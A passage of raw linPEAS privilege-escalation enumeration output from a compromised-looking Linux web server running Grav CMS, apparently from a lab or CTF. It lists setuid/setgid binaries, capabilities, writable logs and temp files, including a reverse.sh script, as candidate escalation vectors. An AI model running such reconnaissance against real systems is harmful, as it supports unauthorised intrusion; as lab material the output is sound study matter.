-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /snap/core20/1611/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root utmp 15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 83K Nov 29 11:53 /usr/bin/chage
-rwxr-sr-x 1 root tty 35K Feb  7  2022 /usr/bin/wall
-rwxr-sr-x 1 root shadow 31K Nov 29 11:53 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 343K Mar 30  2022 /usr/bin/ssh-agent
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 43K Feb  2 09:22 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 43K Feb  2 09:22 /usr/sbin/pam_extrausers_chkpwd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so                                                                                    
/etc/ld.so.conf                                                                                                                                             
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                             
Current env capabilities:                                                                                                                                   
Current: =
Current proc capabilities:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/snap/core20/1852/usr/bin/ping = cap_net_raw+ep
/snap/core20/1611/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                             
                                                                                                                                                            
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3500 Jan 31 22:09 sbin.dhclient                                                                                                     
-rw-r--r-- 1 root root  3202 Feb 25  2020 usr.bin.man
-rw-r--r-- 1 root root 28486 Nov 28 04:55 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1482 Feb 10 11:34 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                                     
files with acls in searched folders Not Found                                                                                                               
                                                                                                                                                            
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                  
/usr/bin/rescan-scsi-bus.sh                                                                                                                                 
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2023-04-08+21:32:01.1760807270 /var/www/html/grav-admin/cache/compiled/blueprints/master-cli.php                                                            
2023-04-08+21:31:01.8960791640 /var/www/html/grav-admin/cache/compiled/config/master-cli.php
2023-03-29+07:18:01.8874598430 /var/www/html/grav-admin/cache/compiled/files/5d400bb9062da9cb9932985ebb53ec40.yaml.php
2023-03-29+07:17:45.9275121400 /var/www/html/grav-admin/user/config/system.yaml
2023-03-29+07:17:45.9275121400 /var/www/html/grav-admin/cache/doctrine/45f10117/88/446f637472696e654e616d65737061636543616368654b65795b666c65782d6f626a656374732d757365722d6163636f756e7473672d34356631303131375d.doctrinecache.data
2023-03-29+07:17:45.9275121400 /var/www/html/grav-admin/cache/compiled/files/8191b9a8e5dac69dbbc42a480e40da31.yaml.php
2023-03-29+07:17:45.9275121400 /var/www/html/grav-admin/cache/compiled/files/15ca411a557aecaf06dc84b61939518c.yaml.php
2023-03-29+07:17:45.9235121560 /var/www/html/grav-admin/cache/compiled/files/d3dcee27ed69d92f849f41d9f8793d66.yaml.php
2023-03-29+07:17:45.9195121720 /var/www/html/grav-admin/user/accounts/admin.yaml
2023-03-29+07:17:45.8675123820 /var/www/html/grav-admin/cache/compiled/languages/master-cli.php
2023-03-29+07:17:45.8475124620 /var/www/html/grav-admin/cache/compiled/files/7ce4281411c7a8345d6a0c380670940e.yaml.php
2023-03-29+07:17:45.8475124620 /var/www/html/grav-admin/cache/compiled/files/74f4d47c0ad664b7ed04cf25d3edee0f.yaml.php
2023-03-29+07:17:45.8435124780 /var/www/html/grav-admin/cache/compiled/files/aba7c06f44e261f71c723afeb1275170.yaml.php
2023-03-29+07:17:45.8435124780 /var/www/html/grav-admin/cache/compiled/files/8dcda12be5d8b0bf029fa8805076a231.yaml.php
2023-03-29+07:17:45.8435124780 /var/www/html/grav-admin/cache/compiled/files/544950de949e6289bd4e181f58363794.yaml.php
2023-03-29+07:17:45.8435124780 /var/www/html/grav-admin/cache/compiled/files/424bed8e5a2656341a169698f76602dc.yaml.php
2023-03-29+07:17:45.8395124940 /var/www/html/grav-admin/cache/compiled/files/8145a9ed68090c42e10651499cc616e0.yaml.php
2023-03-29+07:17:45.8395124940 /var/www/html/grav-admin/cache/compiled/files/45a96991ab1f8f3079f2c4b461aa7ce0.yaml.php
2023-03-29+07:17:45.8395124940 /var/www/html/grav-admin/cache/compiled/files/2caad1706252c6bd2ff9e0960faee29a.yaml.php
2023-03-29+07:17:45.8395124940 /var/www/html/grav-admin/cache/compiled/files/1f2b23b33e1990989d30e84fd6c64f28.yaml.php
2023-03-29+07:17:45.8395124940 /var/www/html/grav-admin/cache/compiled/files/16ed580f4247281b0ecb117c29a7793e.yaml.php
2023-03-29+07:17:45.8355125100 /var/www/html/grav-admin/cache/compiled/files/dc9bca5e3facc8ae73913012af2ce9a3.yaml.php
2023-03-29+07:17:45.8355125100 /var/www/html/grav-admin/cache/compiled/files/ce08147d305b7530d7f7ef0f3d419584.yaml.php
2023-03-29+07:17:45.8355125100 /var/www/html/grav-admin/cache/compiled/files/c678dc150eaffb406a8499573d882170.yaml.php
2023-03-29+07:17:45.8315125260 /var/www/html/grav-admin/cache/compiled/files/fb564f7158343cac88982843640ea90b.yaml.php
2023-03-29+07:17:45.8315125260 /var/www/html/grav-admin/cache/compiled/files/a79dc7f1fe8bc405752b7a26202a49be.yaml.php
2023-03-29+07:17:45.8315125260 /var/www/html/grav-admin/cache/compiled/files/7452f444ef4da774b676067ce331ccb8.yaml.php
2023-03-29+07:17:45.8315125260 /var/www/html/grav-admin/cache/compiled/files/6f10c190011404d2c4673343a95b090a.yaml.php
2023-03-29+07:17:45.8315125260 /var/www/html/grav-admin/cache/compiled/files/061bad51ea8d7aabe007b6c6595c877d.yaml.php
2023-03-29+07:17:45.8275125430 /var/www/html/grav-admin/cache/compiled/files/cc602ebeee0b2509ba0d853097930db9.yaml.php
2023-03-29+07:17:45.8275125430 /var/www/html/grav-admin/cache/compiled/files/8f536518cab71a9c539e041c9094d9e5.yaml.php
2023-03-29+07:17:45.8275125430 /var/www/html/grav-admin/cache/compiled/files/829d89f6c4dc8d6a32cdd3b48c0a03bb.yaml.php
2023-03-29+07:17:45.8275125430 /var/www/html/grav-admin/cache/compiled/files/5b65a1a765522cf5cb68defe69372174.yaml.php
2023-03-29+07:17:45.8275125430 /var/www/html/grav-admin/cache/compiled/files/10b284ec9e932d2ebb742a3faba600bc.yaml.php
2023-03-29+07:17:45.8235125590 /var/www/html/grav-admin/cache/compiled/files/a0164c0b4947f20cdc38d072353abbce.yaml.php
2023-03-29+07:17:45.8235125590 /var/www/html/grav-admin/cache/compiled/files/85d1c7b618685a47e0825c4b666c5399.yaml.php
2023-03-29+07:17:45.8235125590 /var/www/html/grav-admin/cache/compiled/files/4549b4748497dc4bdc6c16774844ee7e.yaml.php
2023-03-29+07:17:45.8235125590 /var/www/html/grav-admin/cache/compiled/files/36312ea6ed2ae1cf5b0aae56fc54cbaf.yaml.php
2023-03-29+07:17:45.8195125750 /var/www/html/grav-admin/cache/compiled/files/cbe01811a6a69e2da03d3c7144ee09da.yaml.php
2023-03-29+07:17:45.8195125750 /var/www/html/grav-admin/cache/compiled/files/ca45d3afc01b3dea12032505f30ebe60.yaml.php
2023-03-29+07:17:45.8195125750 /var/www/html/grav-admin/cache/compiled/files/8d210b45c2a5cd7b7dcb7137b49e19b4.yaml.php
2023-03-29+07:17:45.8195125750 /var/www/html/grav-admin/cache/compiled/files/34734ca759237847f9209070f66f876a.yaml.php
2023-03-29+07:17:45.8155125910 /var/www/html/grav-admin/cache/compiled/files/c7850461f0597407a6558f427d0dd5ee.yaml.php
2023-03-29+07:17:45.8155125910 /var/www/html/grav-admin/cache/compiled/files/44aebe1283dd296d04f6e0798866a0f8.yaml.php
2023-03-29+07:17:45.8155125910 /var/www/html/grav-admin/cache/compiled/files/0c00f8dbb7b1053a76b04558860f58ae.yaml.php
2023-03-29+07:17:45.8115126070 /var/www/html/grav-admin/cache/compiled/files/c73cd00346c244c5ca890afe37331f72.yaml.php
2023-03-29+07:17:45.8115126070 /var/www/html/grav-admin/cache/compiled/files/bfbdb9d68f1ed55a336ef1c16d41a845.yaml.php
2023-03-29+07:17:45.8115126070 /var/www/html/grav-admin/cache/compiled/files/b934ff3b7e7fd4106a86c176ebf122e0.yaml.php
2023-03-29+07:17:45.8115126070 /var/www/html/grav-admin/cache/compiled/files/761a4783dd7cf30d2b7e019fb8a96b46.yaml.php
2023-03-29+07:17:45.8075126230 /var/www/html/grav-admin/cache/compiled/files/e7a81eb890511158f927120de6e389b5.yaml.php
2023-03-29+07:17:45.8075126230 /var/www/html/grav-admin/cache/compiled/files/e0624716ddf3b60752c75c3f7f124d2c.yaml.php
2023-03-29+07:17:45.8075126230 /var/www/html/grav-admin/cache/compiled/files/20eef5dcd5a23427a0cd3147ceab9267.yaml.php
2023-03-29+07:17:45.8075126230 /var/www/html/grav-admin/cache/compiled/files/0ee93fb84ace4ed65189e7fa9d7d7018.yaml.php
2023-03-29+07:17:45.8075126230 /var/www/html/grav-admin/cache/compiled/files/03bb2a0163d3adf78dbc8eec6ccd8ba4.yaml.php
2023-03-29+07:17:45.8035126390 /var/www/html/grav-admin/cache/compiled/files/effc392c50ad57432344b2dac752ff9c.yaml.php
2023-03-29+07:17:45.8035126390 /var/www/html/grav-admin/cache/compiled/files/85fd4af9f673fc8333e4a6669e34ae25.yaml.php
2023-03-29+07:17:45.8035126390 /var/www/html/grav-admin/cache/compiled/files/1f804a3ecc67874d90a0066ae9d30ad6.yaml.php
2023-03-29+07:17:45.7915126880 /var/www/html/grav-admin/cache/compiled/files/7faec3f458ab7419f1344981ad5d1e67.yaml.php
2023-03-29+07:17:45.7915126880 /var/www/html/grav-admin/cache/compiled/files/17b68399f5f397617bdfffce582f955b.yaml.php
2023-03-29+07:17:45.7875127040 /var/www/html/grav-admin/cache/compiled/files/fed172fece20c86497899edd6c320931.yaml.php
2023-03-29+07:17:45.7875127040 /var/www/html/grav-admin/cache/compiled/files/499060426570c54e955283765aa63bbd.yaml.php
2023-03-29+07:17:45.7835127200 /var/www/html/grav-admin/cache/compiled/files/d0e2da73dda24614fe699b1fc68d978f.yaml.php
2023-03-29+07:17:45.7835127200 /var/www/html/grav-admin/cache/compiled/files/b2d6fac84353834a2bb03d002ede2bb0.yaml.php
2023-03-29+07:17:45.7835127200 /var/www/html/grav-admin/cache/compiled/files/aaad946ddeda54dabaa50ded118ddde0.yaml.php
2023-03-29+07:17:45.7795127350 /var/www/html/grav-admin/cache/compiled/files/ea55a564c548fa1b6930cc7cc409cdd8.yaml.php
2023-03-29+07:17:45.7795127350 /var/www/html/grav-admin/cache/compiled/files/d3bf1db9842d103a806df093c8cd12ac.yaml.php
2023-03-29+07:17:45.7795127350 /var/www/html/grav-admin/cache/compiled/files/b014b56f74fe828af3d565008e57c289.yaml.php
2023-03-29+07:17:45.7795127350 /var/www/html/grav-admin/cache/compiled/files/aecc2ceffa35c2dd60065687f14b2a93.yaml.php
2023-03-29+07:17:45.7755127510 /var/www/html/grav-admin/cache/compiled/files/c8a0cf1e07cfe26db352cd19fc288a57.yaml.php
2023-03-29+07:17:45.7755127510 /var/www/html/grav-admin/cache/compiled/files/abe30593b1085a75cd71b9dc93ea8b74.yaml.php

╔══════════╣ Unexpected in root
/access.log                                                                                                                                                 
/error.log
/swap.img

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                           
total 44                                                                                                                                                    
drwxr-xr-x   2 root root 4096 Mar 29 07:03 .
drwxr-xr-x 103 root root 4096 Mar 29 07:17 ..
-rw-r--r--   1 root root   96 Dec  5  2019 01-locale-fix.sh
-rw-r--r--   1 root root  835 May 11  2022 apps-bin-path.sh
-rw-r--r--   1 root root  729 Feb  2  2020 bash_completion.sh
-rw-r--r--   1 root root 1003 Aug 13  2019 cedilla-portuguese.sh
-rw-r--r--   1 root root 1107 Nov  3  2019 gawk.csh
-rw-r--r--   1 root root  757 Nov  3  2019 gawk.sh
-rw-r--r--   1 root root 1557 Feb 17  2020 Z97-byobu.sh
-rwxr-xr-x   1 root root  873 Jun 15  2022 Z99-cloudinit-warnings.sh
-rwxr-xr-x   1 root root 3417 Jun 15  2022 Z99-cloud-locale-test.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                             
                                                                                                                                                            
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                
═╣ Credentials in fstab/mtab? ........... No                                                                                                                
═╣ Can I read shadow files? ............. No                                                                                                                
═╣ Can I read shadow plists? ............ No                                                                                                                
═╣ Can I write shadow plists? ........... No                                                                                                                
═╣ Can I read opasswd file? ............. No                                                                                                                
═╣ Can I write in network-scripts? ...... No                                                                                                                
═╣ Can I read root folder? .............. No                                                                                                                
                                                                                                                                                            
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                      
/root/
/var/www
/var/www/html/grav-admin/user/data/scheduler
/var/www/html/grav-admin/user/data/scheduler/status.yaml
/var/www/html/grav-admin/cache/doctrine/c0a5645b
/var/www/html/grav-admin/cache/doctrine/c0a5645b/51
/var/www/html/grav-admin/cache/doctrine/c0a5645b/51/672d63306135363435625b38353861303134343065303864346234316136363430373662383836383534385d5b315d.doctrinecache.data
/var/www/html/grav-admin/cache/doctrine/e0240e55
/var/www/html/grav-admin/cache/doctrine/e0240e55/21
/var/www/html/grav-admin/cache/doctrine/e0240e55/21/672d65303234306535355b62613464616633353539336464313235303333383566666139346433323737655d5b315d.doctrinecache.data
/var/www/html/grav-admin/cache/doctrine/66ba3786
/var/www/html/grav-admin/cache/doctrine/66ba3786/bc
/var/www/html/grav-admin/cache/doctrine/66ba3786/bc/672d36366261333738365b65393535336233663262346430643565333936643235383030636165306432665d5b315d.doctrinecache.data
/var/www/html/grav-admin/cache/doctrine/c10f8065
/var/www/html/grav-admin/cache/doctrine/c10f8065/e1
/var/www/html/grav-admin/cache/doctrine/c10f8065/e1/672d63313066383036355b31666638326638393639663235613262643964613934363664643530636436365d5b315d.doctrinecache.data
/var/www/html/grav-admin/cache/doctrine/01e20493
/var/www/html/grav-admin/cache/doctrine/01e20493/6b
/var/www/html/grav-admin/cache/doctrine/01e20493/6b/672d30316532303439335b65383736306162626262306334633837376132306662313637343839633431355d5b315d.doctrinecache.data
/var/www/html/grav-admin/cache/doctrine/c10f608a
/var/www/html/grav-admin/cache/doctrine/c10f608a/54
/var/www/html/grav-admin/cache/doctrine/c10f608a/54/672d63313066363038615b30363131326134363261643231616537373433623031653162376638356563365d5b315d.doctrinecache.data
/var/www/html/grav-admin/cache/compiled/files/94b6065b5d9e27a75e4ea6bdee08223a.yaml.php
/var/www/html/grav-admin/cache/compiled/files/49f9af5c5c154fb2cf45823907203103.yaml.php
/var/www/html/grav-admin/cache/compiled/files/df44d93246d0a3862ef8330fde38ec03.yaml.php
/var/www/html/grav-admin/cache/compiled/files/f45f4b93632a39f6b482d3144f16dfb4.yaml.php
/var/www/html/grav-admin/cache/compiled/files/2a22c656f2aa4c931293a605c083833b.yaml.php
/var/www/html/grav-admin/cache/compiled/files/6b09b1b45ff00cff059a92df53007b4a.yaml.php

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/var/www/html/grav-admin/user/data                                                                                                                          

╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                            
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/access.log                                                                                                                                                 
/var/log/kern.log
/var/log/journal/d2737565435f491e97f49bb5b34ba02e/system.journal
/var/log/syslog
/var/log/auth.log
/var/www/html/grav-admin/user/config/scheduler.yaml
/var/www/html/grav-admin/user/data/scheduler/status.yaml
/var/www/html/grav-admin/cache/problem-check-g-6c9da13f.json
/var/www/html/grav-admin/cache/doctrine/e0240e55/21/672d65303234306535355b62613464616633353539336464313235303333383566666139346433323737655d5b315d.doctrinecache.data
/var/www/html/grav-admin/cache/doctrine/66ba3786/bc/672d36366261333738365b65393535336233663262346430643565333936643235383030636165306432665d5b315d.doctrinecache.data
/var/www/html/grav-admin/cache/doctrine/6c9da13f/d3/666c65782d6f626a656374732d757365722d6163636f756e7473672d36633964613133665b5f5f6b6579735d5b315d.doctrinecache.data
/var/www/html/grav-admin/cache/doctrine/6c9da13f/b4/672d3663396461313366245b64313461383032326230383566396566313964343739636264643538313132375d5b315d.doctrinecache.data
/var/www/html/grav-admin/cache/doctrine/6c9da13f/5a/672d3663396461313366245b36623662613566343337646266303861656334316463633938313332353533355d5b315d.doctrinecache.data
/var/www/html/grav-admin/cache/doctrine/6c9da13f/9c/672d3663396461313366245b33346236626464333632353363396430303730653661336463303932633633365d5b315d.doctrinecache.data
/var/www/html/grav-admin/cache/compiled/config/master-cli.php
/var/www/html/grav-admin/cache/compiled/config/master-192.168.76.12.php
/var/www/html/grav-admin/cache/compiled/files/2a22c656f2aa4c931293a605c083833b.yaml.php
/var/www/html/grav-admin/cache/compiled/blueprints/master-cli.php

╔══════════╣ Writable log files (logrotten) (limit 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation                                                                   
logrotate 3.14.0                                                                                                                                            

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes
Writable: /var/www/html/grav-admin/logs/grav.log
                                                                                                                                                            
╔══════════╣ Files inside /var/www (limit 20)
total 12                                                                                                                                                    
drwxr-xr-x  3 root     root     4096 Mar 29 07:16 .
drwxr-xr-x 14 root     root     4096 Mar 29 07:16 ..
drwxrwxr--  3 www-data www-data 4096 Mar 29 07:17 html

╔══════════╣ Files inside others home (limit 20)
/var/www/html/grav-admin/webserver-configs/Caddyfile-0.8.x                                                                                                  
/var/www/html/grav-admin/webserver-configs/nginx.conf
/var/www/html/grav-admin/webserver-configs/lighttpd.conf
/var/www/html/grav-admin/webserver-configs/web.config
/var/www/html/grav-admin/webserver-configs/htaccess.txt
/var/www/html/grav-admin/webserver-configs/Caddyfile
/var/www/html/grav-admin/assets/.gitkeep
/var/www/html/grav-admin/assets/admin-preset.css
/var/www/html/grav-admin/README.md
/var/www/html/grav-admin/CHANGELOG.md
/var/www/html/grav-admin/user/themes/.gitkeep
/var/www/html/grav-admin/user/themes/quark/scss/spectre-exp.scss
/var/www/html/grav-admin/user/themes/quark/scss/spectre-icons.scss
/var/www/html/grav-admin/user/themes/quark/scss/theme/_extensions.scss
/var/www/html/grav-admin/user/themes/quark/scss/theme/_variables.scss
/var/www/html/grav-admin/user/themes/quark/scss/theme/_typography.scss
/var/www/html/grav-admin/user/themes/quark/scss/theme/_blog.scss
/var/www/html/grav-admin/user/themes/quark/scss/theme/_mobile.scss
/var/www/html/grav-admin/user/themes/quark/scss/theme/_footer.scss
/var/www/html/grav-admin/user/themes/quark/scss/theme/_forms.scss
grep: write error: Broken pipe

╔══════════╣ Searching installed mail applications
                                                                                                                                                            
╔══════════╣ Mails (limit 50)
                                                                                                                                                            
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2743 Aug 31  2022 /etc/apt/sources.list.curtin.old                                                                                   
-rw-r--r-- 1 root root 2756 Feb 13  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rw-r--r-- 1 root root 392817 Feb  9  2020 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 11886 Mar 29 07:03 /usr/share/info/dir.old
-rw-r--r-- 1 root root 9073 Jan  5 16:08 /usr/lib/modules/5.4.0-137-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9833 Jan  5 16:08 /usr/lib/modules/5.4.0-137-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 9073 Mar 17 18:08 /usr/lib/modules/5.4.0-146-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9833 Mar 17 18:08 /usr/lib/modules/5.4.0-146-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 44048 Sep 19  2022 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 1413 Jan 24 07:34 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-38.pyc
-rw-r--r-- 1 root root 1802 Aug 15  2022 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rwxr-xr-x 1 root root 1086 Nov 25  2019 /usr/src/linux-headers-5.4.0-137/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rw-r--r-- 1 root root 237863 Jan  5 16:08 /usr/src/linux-headers-5.4.0-137-generic/.config.old
-rw-r--r-- 1 root root 0 Jan  5 16:08 /usr/src/linux-headers-5.4.0-137-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Jan  5 16:08 /usr/src/linux-headers-5.4.0-137-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 237898 Mar 17 18:08 /usr/src/linux-headers-5.4.0-146-generic/.config.old
-rw-r--r-- 1 root root 0 Mar 17 18:08 /usr/src/linux-headers-5.4.0-146-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Mar 17 18:08 /usr/src/linux-headers-5.4.0-146-generic/include/config/wm831x/backup.h
-rwxr-xr-x 1 root root 1086 Nov 25  2019 /usr/src/linux-headers-5.4.0-146/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rwxrwxr-- 1 www-data www-data 1473 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/themes/grav/app/dashboard/backup.js
-rwxrwxr-- 1 www-data www-data 990 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/themes/grav/templates/partials/backups-button.html.twig
-rwxrwxr-- 1 www-data www-data 3509 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/themes/grav/templates/partials/tools-backups.html.twig
-rwxrwxr-- 1 www-data www-data 453 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/themes/grav/templates/partials/tools-backups-titlebar.html.twig
-rwxrwxr-- 1 www-data www-data 1588 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/themes/grav/templates/forms/fields/backupshistory/backupshistory.html.twig
-rwxrwxr-- 1 www-data www-data 110 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/pages/admin/backup.md
-rwxrwxr-- 1 www-data www-data 371 Mar 17  2021 /var/www/html/grav-admin/system/config/backups.yaml
-rwxrwxr-- 1 www-data www-data 3861 Mar 17  2021 /var/www/html/grav-admin/system/blueprints/config/backups.yaml

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3031001                                                
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3031001

 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)                                                                                             
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)                                                                                   
                                                                                                                                                            
╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                  
total 12K
drwxr-xr-x  3 root     root     4.0K Mar 29 07:16 .
drwxr-xr-x 14 root     root     4.0K Mar 29 07:16 ..
drwxrwxr--  3 www-data www-data 4.0K Mar 29 07:17 html

/var/www/html:
total 12K
drwxrwxr--  3 www-data www-data 4.0K Mar 29 07:17 .
drwxr-xr-x  3 root     root     4.0K Mar 29 07:16 ..

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw------- 1 root root 0 Mar  8 04:34 /snap/core20/1852/etc/.pwd.lock                                                                                       
-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1852/etc/skel/.bash_logout
-rw------- 1 root root 0 Aug  5  2022 /snap/core20/1611/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1611/etc/skel/.bash_logout
-rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skel/.bash_logout
-rw------- 1 root root 0 Aug 31  2022 /etc/.pwd.lock
-rw------- 1 root root 0 Apr  5 23:01 /run/snapd/lock/.lock
-rw-r--r-- 1 root root 20 Apr  5 23:01 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Apr  8 20:40 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 landscape landscape 0 Aug 31  2022 /var/lib/landscape/.cleanup.user
-rwxrwxr-- 1 www-data www-data 4692 Mar 17  2021 /var/www/html/grav-admin/user/plugins/form/.eslintrc
-rwxrwxr-- 1 www-data www-data 831 Mar 17  2021 /var/www/html/grav-admin/user/plugins/email/vendor/swiftmailer/swiftmailer/.php_cs.dist
-rwxrwxr-- 1 www-data www-data 61 Mar 17  2021 /var/www/html/grav-admin/user/plugins/login/vendor/dasprid/enum/.coveralls.yml
-rwxrwxr-- 1 www-data www-data 4708 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/themes/grav/.eslintrc
-rwxrwxr-- 1 www-data www-data 41 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/themes/grav/.babelrc
-rwxrwxr-- 1 www-data www-data 438 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/vendor/p3k/picofeed/lib/PicoFeed/Rules/.blogs.nytimes.com.php
-rwxrwxr-- 1 www-data www-data 860 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/vendor/p3k/picofeed/lib/PicoFeed/Rules/.slate.com.php
-rwxrwxr-- 1 www-data www-data 427 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/vendor/p3k/picofeed/lib/PicoFeed/Rules/.blog.lemonde.fr.php
-rwxrwxr-- 1 www-data www-data 311 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/vendor/p3k/picofeed/lib/PicoFeed/Rules/.phoronix.com.php
-rwxrwxr-- 1 www-data www-data 1797 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/vendor/p3k/picofeed/lib/PicoFeed/Rules/.wired.com.php
-rwxrwxr-- 1 www-data www-data 327 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/vendor/p3k/picofeed/lib/PicoFeed/Rules/.over-blog.com.php
-rwxrwxr-- 1 www-data www-data 443 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/vendor/p3k/picofeed/lib/PicoFeed/Rules/.theguardian.com.php
-rwxrwxr-- 1 www-data www-data 426 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/vendor/p3k/picofeed/lib/PicoFeed/Rules/.wsj.com.php
-rwxrwxr-- 1 www-data www-data 308 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/vendor/p3k/picofeed/lib/PicoFeed/Rules/.nytimes.com.php
-rwxrwxr-- 1 www-data www-data 358 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/vendor/p3k/picofeed/lib/PicoFeed/Rules/.igen.fr.php
-rwxrwxr-- 1 www-data www-data 1078 Mar 17  2021 /var/www/html/grav-admin/user/plugins/admin/vendor/p3k/picofeed/lib/PicoFeed/Rules/.wikipedia.org.php
-rwxrwxr-- 1 www-data www-data 5394 Mar 17  2021 /var/www/html/grav-admin/user/plugins/flex-objects/.eslintrc
-rwxrwxr-- 1 www-data www-data 3198 Mar 17  2021 /var/www/html/grav-admin/.htaccess

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxrwxr-x 1 www-data www-data 828260 Mar 28 02:35 /tmp/linpeas.sh                                                                                          
-rwxrwxr-x 1 www-data www-data 55 Apr  8 21:28 /tmp/reverse.sh
-rw-r--r-- 1 root root 4264 Mar 29 07:16 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 39920 Mar 29 07:17 /var/backups/apt.extended_states.0
